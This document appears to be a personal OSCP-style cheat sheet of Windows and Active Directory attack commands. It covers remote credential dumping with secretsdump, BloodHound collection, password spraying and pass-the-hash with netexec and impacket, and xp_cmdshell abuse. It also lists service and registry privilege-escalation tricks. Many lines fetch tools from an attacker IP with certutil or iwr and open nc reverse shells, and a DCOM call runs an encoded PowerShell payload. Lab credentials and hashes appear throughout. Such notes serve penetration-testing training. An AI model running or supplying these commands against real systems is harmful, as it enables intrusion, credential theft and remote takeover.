Surely we can extract with secretsdump from ntds, system or sam that we grab. But more we can extract passwords remotely!

```
impacket-secretsdump oscp/emmet@10.10.1.202
```


## Bloodhound

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Bloodhound`

```
certutil -urlcache -split -f http://192.168.45.171/SharpHound.ps1
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
```
```
netexec ldap nara.nara-security.com -u Tracy.White -p 'zqwj041FGX' --bloodhound -c all -ns 192.168.181.30

nxc ldap dc01.secura.yzx -u Eric.Wallows -p 'EricLikesRunning800' --bloodhound --collection All --dns-server 192.168.136.97


netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.10.184.146
```
```
sudo neo4j start
```
```
bloodhound
```
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
```
MATCH p=shortestPath((n)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC5|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor*1..]->(g:Group))
WHERE g.objectid ENDS WITH "-512" AND n<>g
RETURN p
```
💡 When all else fails - take a look at this cheat sheet SPIDER MODULE / ALL IN ONE!

[https://github.com/seriotonctf/cme-nxc-cheat-sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

```
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip 192.168.219.122
```
```
netexec smb 172.16.229.254 -u Administrator -H 'b2c03054c306ac8fc5f9d188710b0168' --local-auth
```
```
netexec smb 172.16.229.0/24 -u joe -p 'Flowers1' --continue-on-success
```
```
netexec rdp 172.16.191.0/24 -u yoshi -p 'Mushroom!' --continue-on-success
```
```
netexec winrm 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
netexec wmi 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
netexec sql 10.10.137.148 -u sql_svc -p Dolphin1

impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```
```
netexec ssh 10.10.137.148 -u sql_svc -p Dolphin1
```
```
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
```
```
impacket-psexec administrator:']12FIYiy&Frtsz'@192.168.157.122
```
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:1f006e5b3ba84ddc6690f4bb2aa559c8 Administrator@192.168.157.122
```
```
lput mimikatz.exe
lget mimikatz.log
```
```
impacket-wmiexec jim:'Castello1!'@192.168.209.189
```
```
evil-winrm -i 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
evil-winrm -i 172.16.134.7 -u 'relia.com\Administrator' -p 'vau!XCKjNQBv2$'
```
```
upload <file>
download <file>
```
```
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@192.168.219.122
```
```
impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
```

[https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)


## RDP

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > RDP`

```
xfreerdp /u:offsec /d:oscp.lab /p:Seawater! +clipboard /cert:ignore
xfreerdp /u:offsec /d:oscp.lab /pth:<hash> +clipboard /cert:ignore
```


## TTY windows

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > RDP > TTY windows`

[ConPtyShell/Invoke-ConPtyShell.ps1 at master · antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)


## Overpass-the-hash

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Overpass-the-hash`

```
certutil -split -urlcache -f http://192.168.45.228/Rubeus.exe
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\Rubeus.exe asktgt /domain:access.offsec /user:svc_mssql /password:trustno1 /ptt
# view tickets
klist
# get cmd shell
certutil -split -urlcache -f http://192.168.45.214/PsExec.exe
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```


## Powershell Remoting

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Powershell Remoting`

```
Invoke-Command -ComputerName DC01 -ScriptBlock {ipconfig}

$DC01Session = New-PSSession -ComputerName 'DC01'
Enter-PSSession -Session $DC01Session
```


## DCOM

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > DCOM`

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

---


## Windows Enumeration Scripts

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Windows Enumeration Scripts`

- **WinPEAS.exe**
- **windows-exploit-suggester.py**
- **PowerUp.ps1:**

```PowerShell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
# WinPEAs FIX!
```

```PowerShell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile # Check for writable service files
# AbuseFunction (less reliable)
```

- **Seatbelt**
- **JAWS**


## LOLBINS (Living Off The Land Binaries)

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > LOLBINS (Living Off The Land Binaries)`

- _Utilize built-in Windows tools for malicious purposes._


## Token Impersonation

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Token Impersonation`

```PowerShell
whoami /priv
.\GodPotato.exe -cmd "cmd.exe /c whoami"
.\god.exe -cmd "nc.exe 192.168.45.165 4444 -e cmd.exe"
```


## Stored Passwords

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Stored Passwords`

```PowerShell
findstr /si password *.txt *.ini *.config
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```


## AV Enumeration

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > AV Enumeration`

```PowerShell
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```


## WSL (Windows Subsystem for Linux)

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > WSL (Windows Subsystem for Linux)`

```PowerShell
where /R c:\windows wsl.exe
where /R c:\windows bash.exe
c:\Windows\Path\To\wsl.exe whoami
c:\Windows\Path\To\bash.exe
```


## RunAs

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > RunAs`

```PowerShell
cmdkey /list
runas /env /noprofile /savecred /user:<domain>\<administrator_user> "cmd.exe /c whoami > whoami.txt"
runas /env /noprofile /savecred /user:<domain>\<administrator_user> "c:\temp\nc.exe <IP> 443 -e cmd.exe"
```


## Service Permissions (using `sc qc`)

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Service Permissions (using `sc qc`)`

```PowerShell
sc qc <service_name>
```


## Autoruns

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Autoruns`

```PowerShell
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
icacls "<path_to_autorun_program>"
.\accesschk64.exe -wvu "<path_to_autorun_program>" -accepteula
# Create payload with MSFvenom and replace
```


## AlwaysInstallElevated

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > AlwaysInstallElevated`

```PowerShell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# Create malicious MSI with MSFvenom
```


## regsvc Permissions

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > regsvc Permissions`

```PowerShell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# If NT AUTHORITY\INTERACTIVE has FullControl, create payload and modify ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```


## Executable Files Permissions

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Executable Files Permissions`

```PowerShell
.\accesschk64.exe -wvu "<path_to_executable_directory>"
# If Everyone has FILE_ALL_ACCESS, create payload and replace
sc start <vulnerable_service>
```


## StartUp Folder Permissions

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > StartUp Folder Permissions`

```PowerShell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# If BUILTIN\Users has full access, create payload and place there
```


## Binary Paths Permissions

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Binary Paths Permissions`

```PowerShell
.\accesschk64.exe -wuvc Everyone *
.\accesschk64.exe -wuvc <vulnerable_service>
sc qc <vulnerable_service>
# If SERVICE_CHANGE_CONFIG is available, modify binpath
sc config <vulnerable_service> binpath= "net localgroup administrators user /add"
sc start <vulnerable_service>
```


## Config Files

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Config Files`

```PowerShell
notepad C:\Windows\Panther\Unattend.xml
# Extract and decode base64 passwords
echo [base64_string] | base64 -d
```


## Memory

> Source: `01101100-C0D3X-00110110.md` → `File Transfer > SMB Server > Memory`

- _Create a dump file of a running process and analyze with `strings` for sensitive information._
```bash
strings <dump_file>.DMP | grep "Authorization: Basic"
echo -ne [base64_string] | base64 -d
```
